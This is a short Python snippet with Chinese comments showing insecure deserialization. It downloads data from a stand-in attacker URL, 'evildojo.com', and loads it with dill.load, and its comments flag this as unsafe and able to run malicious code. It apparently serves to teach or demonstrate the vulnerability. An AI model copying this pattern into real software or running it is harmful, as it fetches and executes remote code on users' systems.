import dill
import urllib.request

# 从恶意 URL 下载序列化数据
url = "https://evildojo.com/malicious_dill"
response = urllib.request.urlopen(url)

# 使用 dill.load 反序列化（不安全示例）
malicious_object = dill.load(response)  # 不安全，可能执行恶意代码

print(malicious_object)
response.close()
